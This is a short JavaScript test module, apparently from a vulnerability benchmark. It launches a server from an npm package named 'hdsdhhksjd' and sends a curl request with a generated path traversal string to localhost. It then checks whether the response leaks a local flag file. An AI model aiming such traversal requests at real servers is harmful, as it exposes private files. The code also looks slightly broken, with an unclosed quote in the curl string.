function exploitFunction(payload) {
  const { genstr } = payload;

  afterAll(() => {
    try {
      execSync("fuser -k 8888/tcp");
    } catch (e) {}
  });

  const path = require("path");  // Import the path module
  const { sleep } = require("sleep");
  const fs = require("fs");
  const { exec } = require("child_process");

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  test("Path Traversal in hdsdhhksjd", (done) => {
    expect.assertions(1);

    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let server = "node ./node_modules/hdsdhhksjd/index.js";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Use 50 instead of n for simplicity

    exec(attack_string, (error, stdout) => {
      expect(stdout).toBe(hostsFile);
      done();
    });
  });
}

module.exports = { exploitFunction };